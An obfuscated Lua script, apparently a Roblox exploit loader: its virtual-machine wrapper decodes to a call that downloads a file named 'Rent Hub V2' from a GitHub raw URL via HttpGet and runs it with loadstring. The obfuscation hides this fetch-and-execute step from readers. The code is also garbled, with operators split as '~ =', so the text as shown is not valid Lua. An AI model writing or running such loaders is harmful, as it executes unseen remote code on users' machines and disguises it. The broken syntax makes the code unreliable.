do local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or
function() return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local
function v15(v16, v17, ...) local v18 = 1;
local v19;
v16 = v4(v3(v16, 5), "..", function(v30) if (v1(v30, 2) == 79) then v19 = v0(v3(v30, 1, 1));
    return "";
    else local v68 = 0; local v69;
    while true do
        if (v68 == 0) then v69 = v2(v0(v30, 16));
    if v19 then local v98 = v5(v69, v19); v19 = nil;
    return v98;
    else return v69; end
    break; end end end end);
local
function v20(v31, v32, v33) if v33 then local v70 = 0;
local v71;
while true do
    if (v70 == (0 - 0)) then v71 = (v31 / (2 ^ (v32 - (2 - 1)))) % (2 ^ (((v33 - (1 - 0)) - (v32 - 1)) + (2 - 1)));
return v71 - (v71 % (620 - (555 + 64)));
end end
else local v72 = 931 - ((1734 - (282 + 595)) + (1711 - (1523 + 114)));
local v73;
while true do
    if (v72 == (568 - (367 + 181 + 20))) then v73 = ((1323 - 394) - (214 + 713)) ^ (v32 - 1);
return (((v31 % (v73 + v73)) >= v73) and(1 + 0)) or(0 + 0);
end end end end local
function v21() local v34 = v1(v16, v18, v18);
v18 = v18 + 1;
return v34;
end local
function v22() local v35, v36 = v1(v16, v18, v18 + (1067 - (68 + 997)));
v18 = v18 + (1272 - (226 + 1044));
return (v36 * 256) + v35;
end local
function v23() local v37 = 0 - 0;
local v38;
local v39;
local v40;
local v41;
while true do
    if (v37 == (118 - (32 + 85))) then
return (v41 * (16441815 + 335401)) + (v40 * (14533 + 51003)) + (v39 * (1213 - ((1637 - 745) + 65))) + v38;
end
if (v37 == 0) then v38, v39, v40, v41 = v1(v16, v18, v18 + (7 - 4));
v18 = v18 + (6 - 2);
v37 = 1;
end end end local
function v24() local v42 = 350 - (87 + 263);
local v43;
local v44;
local v45;
local v46;
local v47;
local v48;
while true do
    if (v42 == (183 - (67 + (535 - 422)))) then
if (v47 == (442 - (164 + 252 + 26))) then
if (v46 == (0 + 0)) then
return v48 * ((0 - 0) + 0);
else local v99 = 0 - 0;
while true do
    if (v99 == 0) then v47 = 1 + 0;
v45 = 0 - 0;
break;
end end end elseif(v47 == (2999 - ((2549 - (760 + 987)) + 150))) then
return ((v46 == (0 - 0)) and(v48 * ((1 - 0) / 0))) or(v48 * NaN);
end
return v8(v48, v47 - (325 + 698)) * (v45 + (v46 / ((2 + 0) ^ ((2737 - (1789 + 124)) - (201 + 571)))));
end
if (v42 == (997 - (915 + 82))) then v43 = v23();
v44 = v23();
v42 = 1;
end
if (v42 == (5 - (769 - (745 + 21)))) then v47 = v20(v44, 13 + 8, 113 - 82);
v48 = ((v20(v44, 19 + 13) == (1 - 0)) and - (1188 - (1069 + 118))) or((1 + 1) - 1);
v42 = 6 - 3;
end
if (v42 == (1 + 0)) then v45 = 1 - (0 - 0);
v46 = (v20(v44, 886 - (261 + 624), 35 - 15) * ((2 + 0) ^ (823 - (368 + 423)))) + v43;
v42 = 6 - 4;
end end end local
function v25(v49) local v50;
if not v49 then local v74 = (0 + 0) - 0;
while true do
    if (v74 == ((0 - 0) + 0)) then v49 = v23();
if (v49 == (0 + 0)) then
return "";
end
break;
end end end v50 = v3(v16, v18, (v18 + v49) - (1056 - (87 + 968)));
v18 = v18 + v49;
local v51 = {};
for v66 = 4 - 3, #v50 do v51[v66] = v2(v1(v3(v50, v66, v66)));
    end
return v6(v51);
end local v26 = v23;
local
function v27(...) return {
    ...
}, v12("#", ...);
end local
function v28() local v52 = 0;
local v53;
local v54;
local v55;
local v56;
local v57;
local v58;
while true do
    if (v52 == (0 + 0)) then local v75 = 1822 - (301 + 1521); while true do
    if (v75~ = 2) then
else v52 = 1 - 0;
break;
end
if (v75 == (1 + 0)) then v55 = {};
v56 = {
    v53,
    v54,
    nil,
    v55
};
v75 = 2;
end
if (v75 == (1700 - (1419 + 281))) then v53 = {};
v54 = {};
v75 = 1 - 0;
end end end
if (v52 == (75 - (71 + 3))) then local v76 = 0 - 0;
local v77;
while true do
    if (v76~ = (166 - (122 + 44))) then
else v77 = 0 + 0; while true do
    if (v77~ = (2 - 1)) then
else
    for v114 = 1 + 0, v57 do local v115 = 0 + 0;
    local v116;
local v117;
local v118;
while true do
    if (v115~ = (0 - 0)) then
else local v119 = 0;
while true do
    if (v119 == (1 - 0)) then v115 = 1;
break;
end
if (v119~ = (241 - (187 + 54))) then
else v116 = 780 - (162 + 618);
v117 = nil;
v119 = 1 + 0;
end end end
if (v115 == 1) then v118 = nil;
while true do
    if (v116~ = 1) then
else
if (v117 == 1) then v118 = v21() ~ = (0 + 0);
elseif(v117 == (3 - 1)) then v118 = v24();
elseif(v117 == (4 - 1)) then v118 = v25();
end v58[v114] = v118;
break;
end
if (v116~ = (0 + 0)) then
else v117 = v21();
v118 = nil;
v116 = 1637 - (1373 + 263);
end end
break;
end end end v56[1003 - (451 + 549)] = v21();
v77 = 5 - 3;
end
if (v77 == (580 - (361 + 219))) then v57 = v23();
v58 = {};
v77 = 1 + 0;
end
if (v77~ = (2 - 0)) then
else v52 = 2;
break;
end end
break;
end end end
if ((2 - 0) == v52) then local v78 = 1384 - (746 + 638);
while true do
    if (v78 == (982 - (18 + 964))) then
for
v100 = 1 + 0, v23() do local v101 = 0 - 0;
    local v102;
local v103;
local v104;
while true do
    if (v101 == 0) then v102 = 0 - 0;
v103 = nil;
v101 = 1;
end
if (v101~ = (1 + 0)) then
else v104 = nil;
while true do
    if (v102 == (0 + 0)) then local v120 = 850 - (20 + 830); while true do
    if (v120~ = (341 - (218 + 123))) then
else v103 = 0;
v104 = nil;
v120 = 1;
end
if (v120~ = (1582 - (1535 + 46))) then
else v102 = 1 + 0;
break;
end end end
if (v102 == (1 + 0)) then
while true do
    if (v103~ = (560 - (306 + 254))) then
else v104 = v21();
if (v20(v104, 1, 1 + 0) == (0 - 0)) then local v155 = 0 + 0;
local v156;
local v157;
local v158;
local v159;
local v160;
while true do
    if (v155 == (1468 - (899 + 568))) then v158 = nil;
v159 = nil;
v155 = 2 + 0;
end
if ((0 - 0) == v155) then v156 = 0;
v157 = nil;
v155 = 604 - (268 + 335);
end
if (v155~ = (4 - 2)) then
else v160 = nil;
while true do
    if (v156 == (292 - (60 + 230))) then
while
true do
    if (v157 == (1554 - (1126 + 425))) then
if (v20(v159, 3, 408 - (118 + 287)) == (573 - (426 + 146))) then v160[4] = v58[v160[4]];
end v53[v100] = v160;
break;
end
if (1~ = v157) then
else local v176 = 0 + 0;
local v177;
while true do
    if ((1456 - (282 + 1174)) ~ = v176) then
else v177 = 811 - (569 + 242); while true do
    if (v177 == (2 - 1)) then v157 = 2;
break;
end
if ((0 - 0) == v177) then local v185 = 0;
while true do
    if (v185 == 0) then v160 = {
        v22(),
        v22(),
        nil,
        nil
    };
if (v158 == (1024 - (706 + 318))) then local v186 = 977 - (553 + 424);
local v187;
local v188;
local v189;
while true do
    if (v186 == (1251 - (721 + 530))) then v187 = 0 + 0;
v188 = nil;
v186 = 1272 - (945 + 326);
end
if (v186~ = (2 - 1)) then
else v189 = nil;
while true do
    if (v187~ = (1 + 0)) then
else
    while true do
        if (v188~ = 0) then
    else v189 = 0; while true do
        if ((0 + 0) ~ = v189) then
    else v160[2 + 1] = v22();v160[4 + 0] = v22();
    break;end end
    break;end end
    break;end
    if ((700 - (271 + 429)) ~ = v187) then
else v188 = 0 - 0;
v189 = nil;
v187 = 1 + 0;
end end
break;
end end elseif(v158 == 1) then v160[1503 - (1408 + 92)] = v23();
elseif(v158 == 2) then v160[3] = v23() - (2 ^ (1102 - (461 + 625)));
elseif(v158~ = (1291 - (993 + 295))) then
else local v192 = 0 + 0;
local v193;
local v194;
while true do
    if (v192~ = (0 + 0)) then
else v193 = 0;
v194 = nil;
v192 = 4 - 3;
end
if (v192 == (1172 - (418 + 753))) then
while true do
    if (v193 == (0 + 0)) then v194 = 0 + 0; while true do
    if ((0 + 0) == v194) then v160[3 + 0] = v23() - ((1 + 1) ^ (5 + 11));
v160[9 - 5] = v22();
break;
end end
break;
end end
break;
end end end v185 = 1 + 0;
end
if (v185 == (530 - (406 + 123))) then v177 = 1;
break;
end end end end
break;
end end end
if (v157 == (1771 - (1749 + 20))) then local v178 = 0 + 0;
while true do
    if ((1323 - (1249 + 73)) ~ = v178) then
else v157 = 1133 - (369 + 761);
break;
end
if ((0 + 0) == v178) then
if (v20(v159, 1, 1 + 0) == (1 - 0)) then v160[2] = v58[v160[2]];
end
if (v20(v159, 2, 3 - 1) == 1) then v160[241 - (64 + 174)] = v58[v160[3]];
end v178 = 1146 - (466 + 679);
end end end
if ((0 + 0) == v157) then v158 = v20(v104, 2 - 0, 6 - 3);
v159 = v20(v104, 11 - 7, 6);
v157 = 1;
end end
break;
end
if ((216 - (42 + 174)) ~ = v156) then
else v157 = 0 + 0;
v158 = nil;
v156 = 1901 - (106 + 1794);
end
if (v156 == (1 + 0)) then v159 = nil;
v160 = nil;
v156 = 1 + 1;
end end
break;
end end end
break;
end end
break;
end end
break;
end end end
for v105 = 1 + 0, v23() do v54[v105 - (2 - 1)] = v28();
    end v78 = 1;
end
if (v78 == (2 - 1)) then
return v56;
end end end end end local
function v29(v59, v60, v61) local v62 = 0;
local v63;
local v64;
local v65;
while true do
    if (v62 == 0) then v63 = v59[1];
v64 = v59[2];
v62 = 1;
end
if (v62 == 1) then v65 = v59[3];
return function(...) local v82 = v63;
local v83 = v64;
local v84 = v65;
local v85 = v27;
local v86 = 1;
local v87 = -1;
local v88 = {};
local v89 = {
    ...
};
local v90 = v12("#", ...) - 1;
local v91 = {};
local v92 = {};
for v96 = 0, v90 do
        if (v96 >= v84) then v88[v96 - v84] = v89[v96 + 1];
        else v92[v96] = v89[v96 + 1];
    end end local v93 = (v90 - v84) + 1;
local v94;
local v95;
while true do local v97 = 0; while true do
    if (v97 == 1) then
if (v95 <= 6) then
if (v95 <= 2) then
if (v95 <= 0) then local v121 = 0;
local v122;
local v123;
while true do
    if (v121 == 0) then v122 = v94[2];
v123 = v92[v94[3]];
v121 = 1;
end
if (v121 == 1) then v92[v122 + 1] = v123;
v92[v122] = v123[v94[4]];
break;
end end elseif(v95 > 1) then local v127 = 0;
local v128;
local v129;
local v130;
local v131;
while true do
    if (v127 == 1) then v87 = (v130 + v128) - 1;
v131 = 0;
v127 = 2;
end
if (0 == v127) then v128 = v94[2];
v129, v130 = v85(v92[v128](v13(v92, v128 + 1, v94[3])));
v127 = 1;
end
if (v127 == 2) then
for v168 = v128, v87 do local v169 = 0; while true do
        if (v169 == 0) then v131 = v131 + 1;v92[v168] = v129[v131];
    break;end end end
    break;end end
    else v92[v94[2]] = v94[3];end elseif(v95 <= 4) then
    if (v95 == 3) then do return;
end
else local v134 = 0;
local v135;
local v136;
while true do
    if (0 == v134) then v135 = v94[2];
v136 = v92[v94[3]];
v134 = 1;
end
if (v134 == 1) then v92[v135 + 1] = v136;
v92[v135] = v136[v94[4]];
break;
end end end elseif(v95 > 5) then v92[v94[2]] = v61[v94[3]];
else v92[v94[2]] = v94[3];
end elseif(v95 <= 9) then
if (v95 <= 7) then local v124 = v94[2];
v92[v124] = v92[v124](v13(v92, v124 + 1, v87));
elseif(v95 > 8) then v92[v94[2]] = v61[v94[3]];
else local v143 = v94[2];
v92[v143] = v92[v143](v13(v92, v143 + 1, v87));
end elseif(v95 <= 11) then
if (v95 > 10) then local v145 = 0;
local v146;
local v147;
local v148;
local v149;
while true do
    if (v145 == 0) then v146 = v94[2];
v147, v148 = v85(v92[v146](v13(v92, v146 + 1, v94[3])));
v145 = 1;
end
if (v145 == 1) then v87 = (v148 + v146) - 1;
v149 = 0;
v145 = 2;
end
if (v145 == 2) then
for v170 = v146, v87 do v149 = v149 + 1;
    v92[v170] = v147[v149];
end
break;
end end
else v92[v94[2]]();
end elseif(v95 > 12) then do return;
    end
else v92[v94[2]]();
end v86 = v86 + 1;
break;
end
if (v97 == 0) then v94 = v82[v86];
v95 = v94[1];
v97 = 1;
end end end end;
end end end
return v29(v28(), {}, v17)(...);
end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403743O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F446F6D616469632O6F662F446F6D616469632O6F662F393366352O613938653536662O3835316166353465663831636534352O31343236333739633666642F52656E7425323048756225323056322E74787400083O0012093O00013O001209000100023O002004000100010003001205000300044O0002000100034O00085O00022O000C3O000100012O000D3O00017O00", v9(), ...);
end
